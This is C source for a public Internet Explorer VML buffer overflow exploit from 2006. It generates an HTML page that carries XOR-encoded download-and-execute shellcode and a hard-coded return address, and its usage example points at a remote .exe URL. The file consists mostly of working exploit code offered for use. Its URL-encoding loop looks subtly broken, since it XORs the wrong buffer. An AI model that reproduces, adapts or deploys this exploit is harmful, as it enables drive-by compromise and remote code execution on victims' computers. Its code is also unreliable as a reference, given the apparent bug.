/*
*-----------------------------------------------------------------------

  *
  * vml.c - Internet Explorer VML Buffer Overflow Download Exec Exploit
  * !!! 0day !!! Public Version !!!
  *
  * Copyright (C) 2006 XSec All Rights Reserved.
  *
  * Author : nop
  * : nop#xsec.org
  * : http://www.xsec.org
  * :
  * Tested : Windows 2000 Server CN
  * : + Internet Explorer 6.0 SP1
  * :
  * Complie : cl vml.c
  * :
  * Usage : d:\>vml
  * :
  * : Usage: vml <URL> [htmlfile]
  * :
  * : d:\>vml http://xsec.org/xxx.exe xxx.htm
  * :
  *
  *-----------------------------------------------------------------------
  -
*/

#include <stdio.h>
#include <stdlib.h>
#include <windows.h>

FILE *fp = NULL;
char *file = "xsec.htm";
char *url = NULL;

#define NOPSIZE 260
#define MAXURL 60

//DWORD ret = 0x7Ffa4512; // call esp for CN
DWORD ret = 0x7800CCDD; // call esp for All win2k

// Search Shellcode
unsigned char dc[] =
"\x8B\xDC\xBE\x6F\x6F\x6F\x70\x4E\xBF\x6F\x30\x30\x70\x4F\x43\x39"
"\x3B\x75\xFB\x4B\x80\x33\xEE\x39\x73\xFC\x75\xF7\xFF\xD3";

// Shellcode Start
unsigned char dcstart[] =
"noop";

// Download Exec Shellcode XOR with 0xee
unsigned char sc[] =
"\x07\x4B\xEE\xEE\xEE\xB1\x8A\x4F\xDE\xEE\xEE\xEE\x65\xAE\xE2\x65"
"\x9E\xF2\x43\x65\x86\xE6\x65\x19\x84\xEA\xB7\x06\xAB\xEE\xEE\xEE"
"\x0C\x17\x86\x81\x80\xEE\xEE\x86\x9B\x9C\x82\x83\xBA\x11\xF8\x7B"
"\x06\xDE\xEE\xEE\xEE\x6D\x02\xCE\x65\x32\x84\xCE\xBD\x11\xB8\xEA"
"\x29\xEA\xED\xB2\x8F\xC0\x8B\x29\xAA\xED\xEA\x96\x8B\xEE\xEE\xDD"
"\x2E\xBE\xBE\xBD\xB9\xBE\x11\xB8\xFE\x65\x32\xBE\xBD\x11\xB8\xE6"
"\x84\xEF\x11\xB8\xE2\xBF\xB8\x65\x9B\xD2\x65\x9A\xC0\x96\xED\x1B"
"\xB8\x65\x98\xCE\xED\x1B\xDD\x27\xA7\xAF\x43\xED\x2B\xDD\x35\xE1"
"\x50\xFE\xD4\x38\x9A\xE6\x2F\x25\xE3\xED\x34\xAE\x05\x1F\xD5\xF1"
"\x9B\x09\xB0\x65\xB0\xCA\xED\x33\x88\x65\xE2\xA5\x65\xB0\xF2\xED"
"\x33\x65\xEA\x65\xED\x2B\x45\xB0\xB7\x2D\x06\xB8\x11\x11\x11\x60"
"\xA0\xE0\x02\x2F\x97\x0B\x56\x76\x10\x64\xE0\x90\x36\x0C\x9D\xD8"
"\xF4\xC1\x9E";

// Shellcode End
unsigned char dcend[] =
"n00p";

// HTML Header
char * header =
"<html xmlns:v=\"urn:schemas-microsoft-com:vml\">\n"
"<head>\n"
"<title>XSec.org</title>\n"
"<style>\n"
"v\\:* { behavior: url(#default#VML); }\n"
"</style>\n"
"</head>\n"
"<body>\n"
"<v:rect style=\"width:20pt;height:20pt\" fillcolor=\"red\">\n"
"<v:fill method=\"";

char * footer =
"\"/>\n"
"</v:rect>\n"
"</body>\n"
"</html>\n"
;

// convert string to NCR
void convert2ncr(unsigned char * buf, int size)
{
	int i=0;
	unsigned int ncr = 0;
	
	for(i=0; i<size; i+=2)
	{
		ncr = (buf[i+1] << 8) + buf[i];
		
		fprintf(fp, "&#%d;", ncr);
	}
}

void main(int argc, char **argv)
{
	unsigned char buf[1024] = {0};
	unsigned char burl[255] = {0};
	int sc_len = 0;
	int psize = 0;
	int i = 0;
	
	unsigned int nop = 0x4141;
	DWORD jmp = 0xeb06eb06;
	
	if (argc < 2)
	{
		printf("Windows VML Download Exec Exploit\n");
		printf("Code by nop nop#xsec.org, Welcome to http://www.xsec.org\n");
		//printf("!!! 0Day !!! Please Keep Private!!!\n");
		printf("\r\nUsage: %s <URL> [htmlfile]\r\n\n", argv[0]);
		exit(1);
	}
	
	url = argv[1];
	if( (!strstr(url, "http://") && !strstr(url, "ftp://")) || strlen(url) <
		10 || strlen(url) > MAXURL)
	{
		printf("[-] Invalid url. Must start with 'http://','ftp://' and < %d bytes.\n", MAXURL);
			return;
	}
	
	printf("[+] download url:%s\n", url);
	
	if(argc >=3) file = argv[2];
	
	printf("[+] exploit file:%s\n", file);
	
	fp = fopen(file, "w+b");
	//fp = fopen(file, "w");
	if(!fp)
	{
		printf("[-] Open file error!\n");
		return;
	}
	
	// print html header
	fprintf(fp, "%s", header);
	fflush(fp);
	
	for(i=0; i<NOPSIZE; i++)
	{
		//fprintf(fp, "&#%d;", nop);
		fprintf(fp, "A");
	}
	
	fflush(fp);
	
	// print shellcode
	memset(buf, 0x90, sizeof(buf));
	//memset(buf, 0x90, NOPSIZE*2);
	
	memcpy(buf, &ret, 4);
	psize = 4+8+0x10;
	
	memcpy(buf+psize, dc, sizeof(dc)-1);
	psize += sizeof(dc)-1;
	
	memcpy(buf+psize, dcstart, 4);
	psize += 4;
	
	sc_len = sizeof(sc)-1;
	memcpy(buf+psize, sc, sc_len);
	psize += sc_len;
	
	// print URL
	memset(burl, 0, sizeof(burl));
	strncpy(burl, url, 60);
	
	for(i=0; i<strlen(url)+1; i++)
	{
		burl[i] = buf[i] ^ 0xee;
	}
	
	memcpy(buf+psize, burl, strlen(url)+1);
	psize += strlen(url)+1;
	
	memcpy(buf+psize, dcend, 4);
	psize += 4;
	
	// print NCR
	convert2ncr(buf, psize);
	
	printf("[+] buff size %d bytes\n", psize);
	
	// print html footer
	fprintf(fp, "%s", footer);
	fflush(fp);
	
	printf("[+] exploit write to %s success!\n", file);
}
